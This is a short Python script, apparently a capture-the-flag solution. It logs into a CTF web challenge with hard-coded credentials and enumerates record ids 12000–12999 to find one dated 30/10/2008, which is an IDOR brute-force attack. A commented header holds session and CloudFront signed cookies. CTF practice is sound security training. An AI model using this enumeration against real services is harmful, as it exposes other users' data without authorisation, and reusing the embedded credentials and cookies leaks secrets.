
import requests

#headers = { 'Cookie': '_ga=GA1.2.2025523862.1467316254; _gid=GA1.2.497259289.1541189288; CloudFront-Signature=DXmxIxOfS3xl-TbxmZKf5jEgMrSAWrdBimlPLGxHhxBHN4zRA3tfRuD6JNFagg7KColaoQK~Odsepfxi05ZI5irmup9~8pWtcNKXFOObbN4jsbiuiMezncOuNWQQmuNKHAftxEopZ2l30W4On6YRMItxb6uBRv2oa5rV0MagFu-o2ealfoj0GwGMzbuA-ZyW5YfFCbmL6bz~bRsADA0QIsxtJ2b8R1iMM5tInxx6aNfSuZ1tGcBTPy2HYYyr6vcBAZoX~rndXjOBvHlGkxxzJ16-LEsBOHWhlxECn71sZR4skbvfplRDEuMQug58mi0uzIZtlT3EI-8RY1vDTeRtnA__; CloudFront-Key-Pair-Id=APKAIKPFJR4RIRRZRPGQ; CloudFront-Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTU0MTM2NjcwOX19fV19; PHPSESSID=849361db54321a154c2d6173d7a426fd' }

url = 'https://holeinone.web.baectf.com/?'

data = { 'action':'login', 'user':'richardiii', 'pass':'poundanhour' }

session = requests.Session()
r = session.post(url, data=data)

i = 12000
while i < 13000:
  data = { 'action':'view', 'id':str(i) }
  r = session.post(url, data=data)
  if '30/10/2008' in r.text:
    print(r.text)
  i+= 1


